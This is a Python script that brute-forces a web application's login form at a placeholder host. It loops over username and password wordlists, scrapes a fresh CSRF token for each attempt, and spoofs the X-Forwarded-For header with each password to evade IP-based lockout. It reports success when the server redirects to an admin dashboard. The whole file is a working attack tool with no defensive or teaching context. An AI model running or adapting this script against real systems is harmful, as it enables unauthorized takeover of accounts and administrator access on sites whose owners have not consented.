#!/usr/bin/env python3
import re
import requests
import string

host = 'http://target.com'
login_url = host + '/path/login'

#Define Wordlistfile to use
un_wordlist_file = "/path/to/username/wordlist"
#Define Wordlist file to use
pw_wordlist_file = "/path/to/password/wordlist"
#Init arrays
un_arr = []
pw_arr = []
#Open username wordlist
un_wordlist = open(un_wordlist_file, "r")
with un_wordlist as u:
    for username in u: #Iter over usernames and strip \n
        stripped_un = username.strip().rstrip().lstrip()
        un_arr.append(stripped_un) #append username to username_array
#Opn password wordlist
pw_wordlist = open(pw_wordlist_file, "r")
with pw_wordlist as f:
    for password in f: #Iter over passwords and strip \n
        stripped_pw = password.strip().rstrip().lstrip()
        pw_arr.append(stripped_pw) #append password to password_array

print("Total passwords to test:", len(pw_arr))
for un in un_arr:
    for pw in pw_arr:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

        print('[*] Trying: {p}'.format(p = pw))
        headers = {
            'X-Forwarded-For': pw,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': login_url
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': un,
            'password': pw,
            'save': ''
        }

        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = un, p = pw))
                print()
                break
